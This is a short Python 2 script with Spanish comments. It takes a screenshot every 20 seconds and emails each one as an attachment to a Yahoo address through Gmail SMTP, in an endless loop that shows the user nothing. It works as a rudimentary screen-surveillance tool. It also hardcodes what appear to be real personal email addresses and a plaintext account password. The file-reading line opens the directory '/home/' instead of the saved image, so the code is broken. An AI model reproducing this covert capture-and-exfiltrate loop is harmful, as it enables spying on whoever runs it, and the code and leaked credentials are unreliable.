import smtplib 
# importamos librerias  para construir el mensaje
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText 
#importamos librerias para adjuntar
from email.mime.base import MIMEBase 
from email import encoders 
import os
import autopy
import time
 
def capture():
 # capturamos la pantalla
 screen = autopy.bitmap.capture_screen() 
 screen.save("/home/captura.png")
  
  
def mail():
 
 # definimos los correo de remitente y receptor
 ##se envia un mail a
 addr_to   = 'mateo_penaherrera@yahoo.com'
 ##el mail sale desde el correo
 addr_from = 'oscarmateo1997@gmail.com'
 
 # Define SMTP email server details
 smtp_server = 'smtp.gmail.com:587'
 smtp_user   = 'oscarmateo1997@gmail.com'
 smtp_pass   = 'viviteamomucho'
   
 # Construimos el mail
 msg = MIMEMultipart() 
 msg['To'] = addr_to
 msg['From'] = addr_from
 msg['Subject'] = 'Prueba'
 #cuerpo del mensaje en HTML y si fuera solo text puede colocar en el 2da parametro 'plain'
 msg.attach(MIMEText('Envio de captura de pantalla','html'))
 
 #adjuntamos la captura de pantalla
 ##cargamos el archivo a adjuntar
 fp = open('/home/','rb')
 adjunto = MIMEBase('multipart', 'encrypted')
 #lo insertamos en una variable
 adjunto.set_payload(fp.read()) 
 fp.close()  
 #lo encriptamos en base64 para enviarlo
 encoders.encode_base64(adjunto) 
 #agregamos una cabecera y le damos un nombre al archivo que adjuntamos puede ser el mismo u otro
 adjunto.add_header('Content-Disposition', 'attachment', filename='captura.png')
 #adjuntamos al mensaje
 msg.attach(adjunto) 
 
 # inicializamos el stmp para hacer el envio
 server = smtplib.SMTP(smtp_server)
 server.starttls()
 #logeamos con los datos ya seteados en la parte superior
 server.login(smtp_user,smtp_pass)
 #el envio
 server.sendmail(addr_from, addr_to, msg.as_string())
 #apagamos conexion stmp
 server.quit()
  
 #esto lo puse de prueba para saber que llegaba hasta aca y salia el correo
 print "Se envió el correo"
 
 
def main():
  
 while True:
  # hacemos la captura
  capture()
  # Enviamos el correo
  mail()
  # Tiempo en segundos entre re-envios
  time.sleep(20)
 
main()